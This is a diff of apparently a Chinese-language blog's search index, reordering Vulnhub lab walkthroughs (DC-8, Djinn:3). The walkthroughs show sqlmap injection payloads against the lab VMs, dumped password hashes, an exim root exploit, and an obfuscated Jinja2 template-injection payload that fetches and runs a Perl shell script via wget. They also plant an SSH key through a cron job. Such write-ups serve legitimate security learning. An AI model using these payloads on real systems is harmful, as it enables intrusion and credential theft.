@@ -446,6 +446,72 @@
   </entry>
   <entry>
     <title>vulnhub DC-8靶机</title>
+    <url>//DC-8.html</url>
+    <content><![CDATA[<p>vulnhub里的 DC-8 靶机</p>
+<p>初学者难度</p>
+<a id="more"></a>
+
+<h1 id="DC-8"><a href="#DC-8" class="headerlink" title="DC-8"></a>DC-8</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/ex# nmap -Pn 192.168.2.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.2.158</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:D6:59:23 (VMware)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/ex# nmap -Pn -A 192.168.2.158 -p0-65535</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)</span><br><span class="line">|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)</span><br><span class="line">|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Welcome to DC-8 | DC-8</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><img src="./DC-8/image-20200706175716586.png" alt="image-20200706175716586" style="zoom:50%;" />
+
+<p>点击左侧的链接栏之后，上面的<code>url</code>出现了<code>?nid=1</code>，猜测存在<code>sql</code>注入</p>
+<p>使用<code>?nid=1&#39; or 1=1</code> 探测，发现崩溃</p>
+<img src="./DC-8/image-20200706175905686.png" alt="image-20200706175905686" style="zoom:50%;" />
+
+<p>sql语句暴露，明显存在注入点</p>
+<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/ex# sqlmap -u http://192.168.2.158/?nid=1</span><br><span class="line"></span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: nid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: nid=1 AND 1411=1411</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: nid=1 AND (SELECT 2170 FROM(SELECT COUNT(*),CONCAT(0x71787a7071,(SELECT (ELT(2170=2170,1))),0x7171787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: nid=1 AND (SELECT 6552 FROM (SELECT(SLEEP(5)))CMJv)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 1 column</span><br><span class="line">    Payload: nid=-8664 UNION ALL SELECT CONCAT(0x71787a7071,0x704978464268654b5753624b664c43695648527452644a6c6e78756d467852727a705a6648506d54,0x7171787871)-- -</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+
+
+<p>确实存在注入点，开始注入</p>
+<p>中间过程略</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/ex# sqlmap -u http://192.168.2.158/?nid=1 -D d7db -T users -C name,pass --dump</span><br><span class="line"></span><br><span class="line">Database: d7db                                                                        </span><br><span class="line">Table: users</span><br><span class="line">[2 entries]</span><br><span class="line">+--------+---------------------------------------------------------+</span><br><span class="line">| name   | pass                                                    |</span><br><span class="line">+--------+---------------------------------------------------------+</span><br><span class="line">| admin  | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |</span><br><span class="line">| john   | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |</span><br><span class="line">+--------+---------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>保存到文件中，使用<code>john</code> 破解，得到john的密码为<code>turtle</code></p>
+<p>到 web的登陆界面去，找到登陆的后台<code>http://192.168.2.156/user</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.没开启简洁链接：</span><br><span class="line">    ?q&#x3D;user</span><br><span class="line">    index.php?q&#x3D;user</span><br><span class="line"></span><br><span class="line">2.开启简洁链接</span><br><span class="line">    &#x2F;user</span><br></pre></td></tr></table></figure>
+
+<p>使用john的账户登陆，发现有地方可以edit</p>
+<img src="./DC-8/image-20200706181126430.png" alt="image-20200706181126430" style="zoom:50%;" />
+
+
+
+<img src="./DC-8/image-20200706181156986.png" alt="image-20200706181156986" style="zoom:50%;" />
+
+<p>本地监听，在<code>contract us</code>界面随便写一点，然后submit，得到webshell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br></pre></td></tr></table></figure>
+
+<p>然后看的是exim 提权</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:/var/www/html$ searchsploit exim</span><br></pre></td></tr></table></figure>
+
+<img src="./DC-8/image-20200706181516266.png" alt="image-20200706181516266" style="zoom:50%;" />
+
+<p>在kali中开启<code>apache2</code>，在靶机使用wget 获取文件</p>
+<p>运行<code>./46996.sh -m netcat</code></p>
+<blockquote>
+<p>  -m setuid 不知道为啥不行，netcat倒是可以</p>
+</blockquote>
+<img src="./DC-8/image-20200706181705588.png" alt="image-20200706181705588" style="zoom:50%;" />
+
+]]></content>
+      <categories>
+        <category>exploit</category>
+        <category>DC</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
+        <tag>sql-injection</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulnhub DC-8靶机</title>
     <url>//DC-9.html</url>
     <content><![CDATA[<p>vulnhub里的 DC-8 靶机</p>
 <p>初学者难度</p>
@@ -564,72 +630,6 @@
         <tag>exploit</tag>
         <tag>sql-injection</tag>
         <tag>file-including</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vulnhub DC-8靶机</title>
-    <url>//DC-8.html</url>
-    <content><![CDATA[<p>vulnhub里的 DC-8 靶机</p>
-<p>初学者难度</p>
-<a id="more"></a>
-
-<h1 id="DC-8"><a href="#DC-8" class="headerlink" title="DC-8"></a>DC-8</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/ex# nmap -Pn 192.168.2.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.2.158</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:D6:59:23 (VMware)</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/ex# nmap -Pn -A 192.168.2.158 -p0-65535</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)</span><br><span class="line">|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)</span><br><span class="line">|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Welcome to DC-8 | DC-8</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><img src="./DC-8/image-20200706175716586.png" alt="image-20200706175716586" style="zoom:50%;" />
-
-<p>点击左侧的链接栏之后，上面的<code>url</code>出现了<code>?nid=1</code>，猜测存在<code>sql</code>注入</p>
-<p>使用<code>?nid=1&#39; or 1=1</code> 探测，发现崩溃</p>
-<img src="./DC-8/image-20200706175905686.png" alt="image-20200706175905686" style="zoom:50%;" />
-
-<p>sql语句暴露，明显存在注入点</p>
-<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/ex# sqlmap -u http://192.168.2.158/?nid=1</span><br><span class="line"></span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: nid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: nid=1 AND 1411=1411</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: nid=1 AND (SELECT 2170 FROM(SELECT COUNT(*),CONCAT(0x71787a7071,(SELECT (ELT(2170=2170,1))),0x7171787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: nid=1 AND (SELECT 6552 FROM (SELECT(SLEEP(5)))CMJv)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 1 column</span><br><span class="line">    Payload: nid=-8664 UNION ALL SELECT CONCAT(0x71787a7071,0x704978464268654b5753624b664c43695648527452644a6c6e78756d467852727a705a6648506d54,0x7171787871)-- -</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
-
-
-
-<p>确实存在注入点，开始注入</p>
-<p>中间过程略</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/ex# sqlmap -u http://192.168.2.158/?nid=1 -D d7db -T users -C name,pass --dump</span><br><span class="line"></span><br><span class="line">Database: d7db                                                                        </span><br><span class="line">Table: users</span><br><span class="line">[2 entries]</span><br><span class="line">+--------+---------------------------------------------------------+</span><br><span class="line">| name   | pass                                                    |</span><br><span class="line">+--------+---------------------------------------------------------+</span><br><span class="line">| admin  | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |</span><br><span class="line">| john   | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |</span><br><span class="line">+--------+---------------------------------------------------------+</span><br></pre></td></tr></table></figure>
-
-<p>保存到文件中，使用<code>john</code> 破解，得到john的密码为<code>turtle</code></p>
-<p>到 web的登陆界面去，找到登陆的后台<code>http://192.168.2.156/user</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.没开启简洁链接：</span><br><span class="line">    ?q&#x3D;user</span><br><span class="line">    index.php?q&#x3D;user</span><br><span class="line"></span><br><span class="line">2.开启简洁链接</span><br><span class="line">    &#x2F;user</span><br></pre></td></tr></table></figure>
-
-<p>使用john的账户登陆，发现有地方可以edit</p>
-<img src="./DC-8/image-20200706181126430.png" alt="image-20200706181126430" style="zoom:50%;" />
-
-
-
-<img src="./DC-8/image-20200706181156986.png" alt="image-20200706181156986" style="zoom:50%;" />
-
-<p>本地监听，在<code>contract us</code>界面随便写一点，然后submit，得到webshell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br></pre></td></tr></table></figure>
-
-<p>然后看的是exim 提权</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:/var/www/html$ searchsploit exim</span><br></pre></td></tr></table></figure>
-
-<img src="./DC-8/image-20200706181516266.png" alt="image-20200706181516266" style="zoom:50%;" />
-
-<p>在kali中开启<code>apache2</code>，在靶机使用wget 获取文件</p>
-<p>运行<code>./46996.sh -m netcat</code></p>
-<blockquote>
-<p>  -m setuid 不知道为啥不行，netcat倒是可以</p>
-</blockquote>
-<img src="./DC-8/image-20200706181705588.png" alt="image-20200706181705588" style="zoom:50%;" />
-
-]]></content>
-      <categories>
-        <category>exploit</category>
-        <category>DC</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-        <tag>sql-injection</tag>
       </tags>
   </entry>
   <entry>
@@ -754,103 +754,6 @@
       </tags>
   </entry>
   <entry>
-    <title>vulnhub Djinn:3靶机</title>
-    <url>//Djinn-3.html</url>
-    <content><![CDATA[<p>vulnhub里的 Djinn:3靶机</p>
-<p>中等难度</p>
-<a id="more"></a>
-
-
-
-<h1 id="Djinn-3"><a href="#Djinn-3" class="headerlink" title="Djinn:3"></a>Djinn:3</h1><img src="./Djinn:3/image-20200721185630379.png" alt="image-20200721185630379" style="zoom:50%;" />
-
-
-
-<p>端口扫描，发现开启了<code>22 80 5000 31337</code>端口</p>
-<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><img src="./Djinn:3/image-20200721185744321.png" alt="image-20200721185744321" style="zoom:50%;" />
-
-<p>啥也没有，上面的按钮也啥都不会做，甚至没有<code>robots.txt</code></p>
-<h2 id="5000"><a href="#5000" class="headerlink" title="5000"></a>5000</h2><img src="./Djinn:3/image-20200721190056128.png" alt="image-20200721190056128" style="zoom:50%;" />
-
-
-
-<p>乍一看没什么帮助，其实提到了一个<code>guest</code>用户</p>
-<h2 id="31337"><a href="#31337" class="headerlink" title="31337"></a>31337</h2><p>nc之后</p>
-<img src="Djinn:3/image-20200721190206973.png" alt="image-20200721190206973" style="zoom:50%;" />
-
-<p>使用<code>guest</code>登录</p>
-<img src="Djinn:3/image-20200721190453517.png" alt="image-20200721190453517" style="zoom:50%;" />
-
-
-
-<p><code>update</code>显示没有权限</p>
-<p><code>open</code>增加了一条之后发现5000端口增加了一条数据，尝试命令注入没成功</p>
-<p>（查参考答案）</p>
-<p>后台是一个<code>flask(Jinja2)</code>，存在一个模板注入漏洞</p>
-<p>payload如下(抄的)</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;request|attr(<span class="string">&#x27;application&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="string">&#x27;\x5f\x5fbuiltins\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="string">&#x27;\x5f\x5fimport\x5f\x5f&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>)|attr(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;wget http://192.168.0.107/perl.pl;perl perl.pl&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>访问之后，得到了一个shell</p>
-<img src="Djinn:3/image-20200721191529580.png" alt="image-20200721191529580" style="zoom:50%;" />
-
-
-
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>看一下用户列表（其中jason和stdout是后来创建的）</p>
-<img src="Djinn:3/image-20200721192149525.png" alt="image-20200721192149525" style="zoom:50%;" />
-
-<p>找一下<code>saint</code>用户的文件</p>
-<p><code>find / -user saint -type f 2&gt;/dev/null</code></p>
-<img src="Djinn:3/image-20200721192240006.png" alt="image-20200721192240006" style="zoom:50%;" />
-
-<p>下载下来反编译(uncompyle6)之后</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys, json</span><br><span class="line"><span class="keyword">from</span> glob <span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime <span class="keyword">as</span> dt</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConfigReader</span>:</span></span><br><span class="line">    config = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_config</span>(<span class="params">path</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Reads the config file</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        config_values = &#123;&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">                config_values = json.load(f)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                print(<span class="string">&quot;Couldn&#x27;t properly parse the config file. Please use properl&quot;</span>)</span><br><span class="line">                sys.exit(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                e = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">del</span> e</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> config_values</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_config_path</span>():</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Set the config path</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        files = glob(<span class="string">&#x27;/home/saint/*.json&#x27;</span>)</span><br><span class="line">        other_files = glob(<span class="string">&#x27;/tmp/*.json&#x27;</span>)</span><br><span class="line">        files = files + other_files</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(files) &gt; <span class="number">2</span>:</span><br><span class="line">                files = files[:<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file1 = os.path.basename(files[<span class="number">0</span>]).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">                file2 = os.path.basename(files[<span class="number">1</span>]).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> file1[(-<span class="number">2</span>)] == <span class="string">&#x27;config&#x27;</span>:</span><br><span class="line">                    <span class="keyword">if</span> file2[(-<span class="number">2</span>)] == <span class="string">&#x27;config&#x27;</span>:</span><br><span class="line">                        a = dt.strptime(file1[<span class="number">0</span>], <span class="string">&#x27;%d-%m-%Y&#x27;</span>)</span><br><span class="line">                        b = dt.strptime(file2[<span class="number">0</span>], <span class="string">&#x27;%d-%m-%Y&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> b &lt; a:</span><br><span class="line">                    filename = files[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    filename = files[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> filename</span><br><span class="line"><span class="comment"># okay decompiling a.pyc</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> configuration <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> connectors.ftpconn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> connectors.sshconn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> connectors.utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Main function</span></span><br><span class="line"><span class="string">    Cron job is going to make my work easy peasy</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    configPath = ConfigReader.set_config_path()</span><br><span class="line">    config = ConfigReader.read_config(configPath)</span><br><span class="line">    connections = checker(config)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;FTP&#x27;</span> <span class="keyword">in</span> connections:</span><br><span class="line">        ftpcon(config[<span class="string">&#x27;FTP&#x27;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;SSH&#x27;</span> <span class="keyword">in</span> connections:</span><br><span class="line">            sshcon(config[<span class="string">&#x27;SSH&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;URL&#x27;</span> <span class="keyword">in</span> connections:</span><br><span class="line">                sync(config[<span class="string">&#x27;URL&#x27;</span>], config[<span class="string">&#x27;Output&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-
-
-<p>大意就是在<code>/tmp</code>目录下创建一个<code>day-month-year.config.json</code>的文件，文件里面写<code>URL:xxxx; Output:xxx</code>，就会把URL指向的文件写入到Output中</p>
-<p>那把ssh写进去</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="attr">&quot;URL&quot;</span>:<span class="string">&quot;http://192.168.2.143/id_rsa.pub&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;Output&quot;</span>:<span class="string">&quot;/home/saint/.ssh/authorized_keys&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>然后等一会儿就可以使用saint账户免密登录了</p>
-<img src="Djinn:3/image-20200721194614312.png" alt="image-20200721194614312" style="zoom:50%;" />
-
-
-
-<p>查看一下<code>sudo -l</code></p>
-<img src="Djinn:3/image-20200721194709463.png" alt="image-20200721194709463" style="zoom:50%;" />
-
-<p>那就增加一个root用户组的账户</p>
-<p><code>saint@djinn3:~$ sudo -u root /usr/sbin/adduser --gid 0 stdin</code></p>
-<img src="Djinn:3/image-20200721195016035.png" alt="image-20200721195016035" style="zoom:50%;" />
-
-<p>但是并没有root权限，看一下<code>/etc/sudoer</code></p>
-<img src="Djinn:3/image-20200721195110455.png" alt="image-20200721195110455" style="zoom:50%;" />
-
-<p>创建一个jason用户，他就可以使用<code>(root)apt-get</code></p>
-<img src="Djinn:3/image-20200721195258743.png" alt="image-20200721195258743" style="zoom:50%;" />
-
-
-
-<p>输入<code>jason@djinn3:/home/saint$ sudo -u root /usr/bin/apt-get changelog bash</code></p>
-<img src="Djinn:3/image-20200721195556621.png" alt="image-20200721195556621" style="zoom:50%;" />
-
-<p>然后就得到了一个root的shell</p>
-<img src="Djinn:3/image-20200721195634576.png" alt="image-20200721195634576" style="zoom:50%;" />
-
-]]></content>
-      <categories>
-        <category>exploit</category>
-        <category>Djinn</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-        <tag>command-injection</tag>
-        <tag>RCE</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>vulnhub Djinn:2靶机</title>
     <url>//Djinn-2.html</url>
     <content><![CDATA[<p>vulnhub里的 Djinn:2 靶机</p>
@@ -949,6 +852,103 @@
 
 <p>然后等一会儿就会收到shell</p>
 <img src="Djinn:2/image-20200720171355897.png" alt="image-20200720171355897" style="zoom:50%;" />
+
+]]></content>
+      <categories>
+        <category>exploit</category>
+        <category>Djinn</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
+        <tag>command-injection</tag>
+        <tag>RCE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulnhub Djinn:3靶机</title>
+    <url>//Djinn-3.html</url>
+    <content><![CDATA[<p>vulnhub里的 Djinn:3靶机</p>
+<p>中等难度</p>
+<a id="more"></a>
+
+
+
+<h1 id="Djinn-3"><a href="#Djinn-3" class="headerlink" title="Djinn:3"></a>Djinn:3</h1><img src="./Djinn:3/image-20200721185630379.png" alt="image-20200721185630379" style="zoom:50%;" />
+
+
+
+<p>端口扫描，发现开启了<code>22 80 5000 31337</code>端口</p>
+<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><img src="./Djinn:3/image-20200721185744321.png" alt="image-20200721185744321" style="zoom:50%;" />
+
+<p>啥也没有，上面的按钮也啥都不会做，甚至没有<code>robots.txt</code></p>
+<h2 id="5000"><a href="#5000" class="headerlink" title="5000"></a>5000</h2><img src="./Djinn:3/image-20200721190056128.png" alt="image-20200721190056128" style="zoom:50%;" />
+
+
+
+<p>乍一看没什么帮助，其实提到了一个<code>guest</code>用户</p>
+<h2 id="31337"><a href="#31337" class="headerlink" title="31337"></a>31337</h2><p>nc之后</p>
+<img src="Djinn:3/image-20200721190206973.png" alt="image-20200721190206973" style="zoom:50%;" />
+
+<p>使用<code>guest</code>登录</p>
+<img src="Djinn:3/image-20200721190453517.png" alt="image-20200721190453517" style="zoom:50%;" />
+
+
+
+<p><code>update</code>显示没有权限</p>
+<p><code>open</code>增加了一条之后发现5000端口增加了一条数据，尝试命令注入没成功</p>
+<p>（查参考答案）</p>
+<p>后台是一个<code>flask(Jinja2)</code>，存在一个模板注入漏洞</p>
+<p>payload如下(抄的)</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;request|attr(<span class="string">&#x27;application&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="string">&#x27;\x5f\x5fbuiltins\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="string">&#x27;\x5f\x5fimport\x5f\x5f&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>)|attr(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;wget http://192.168.0.107/perl.pl;perl perl.pl&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问之后，得到了一个shell</p>
